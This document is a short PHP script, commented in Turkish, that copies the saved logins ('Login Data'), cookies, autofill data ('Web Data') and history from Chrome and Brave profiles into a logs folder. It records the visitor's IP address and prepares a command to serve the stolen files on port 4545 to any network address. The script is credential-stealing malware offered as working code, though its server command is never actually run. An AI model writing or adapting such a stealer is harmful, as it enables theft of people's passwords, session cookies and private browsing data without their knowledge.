<?php
// Tarayıcıların veri yollarını tanımlayın
$browsers = [
    'google-chrome' => getenv('LOCALAPPDATA') . '\\Google\\Chrome\\User Data',
    'brave' => getenv('LOCALAPPDATA') . '\\BraveSoftware\\Brave-Browser\\User Data',
    // Diğer tarayıcı yollarını ekleyebilirsiniz.
];

// Hedef log dizini
$logDir = __DIR__ . '/logs/';
if (!file_exists($logDir)) {
    mkdir($logDir, 0755, true);
}

$logFile = $logDir . 'copy_log_' . date('Y-m-d_H-i-s') . '.txt';

// Log yazma fonksiyonu
function logMessage($message, $logFile) {
    file_put_contents($logFile, $message . PHP_EOL, FILE_APPEND);
}

// Tarayıcı dosyalarını metin dosyasına yazma
foreach ($browsers as $browser => $path) {
    $profilePath = $path . '\\Default';
    $files = [
        'Login Data',
        'Web Data',
        'Network\\Cookies',
        'History'
    ];

    foreach ($files as $file) {
        $source = $profilePath . '\\' . $file;
        $destination = $logDir . $browser . '_' . str_replace(['\\', '/'], '_', $file) . '.txt';

        if (file_exists($source)) {
            // Dosyayı okuyup metin dosyasına yaz
            $content = file_get_contents($source);
            if ($content !== false) {
                file_put_contents($destination, $content);
                logMessage("Copied: $source to $destination", $logFile);
            } else {
                logMessage("Failed to read: $source", $logFile);
            }
        } else {
            logMessage("File not found: $source", $logFile);
        }
    }
}

// Kullanıcı IP adresini al
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function logIP($ip) {
    global $logDir;
    $logFile = $logDir . 'ip_log.txt';
    
    $date = date("Y-m-d H:i:s"); // Tarih ve saat bilgisi
    $logEntry = "[$date] IP: $ip\n";
    
    file_put_contents($logFile, $logEntry, FILE_APPEND);
}

$userIP = getUserIP();

// IP türünü belirle
if (filter_var($userIP, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
    $ipType = "IPv6";
} elseif (filter_var($userIP, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    $ipType = "IPv4";
} else {
    $ipType = "Geçersiz IP";
}

// IP loglama
logIP($userIP);

// Kullanıcıya sonuçları göster
echo "<h1>Completed</h1>";
echo "<p>Kullanıcının $ipType adresi: " . $userIP . "</p>";

// Basit bir HTTP sunucusu çalıştır
$port = 4545; // Kullanılacak port
$cmd = "php -S 0.0.0.0:$port -t " . escapeshellarg($logDir);

// Arka planda sunucuyu başlat
echo "<p>Logs are being served at: <a href='http://localhost:$port' target='_blank'>http://localhost:$port</a></p>";

// Kullanıcıyı view.php dosyasına yönlendirme
header("Location: view.php");
exit();
?>
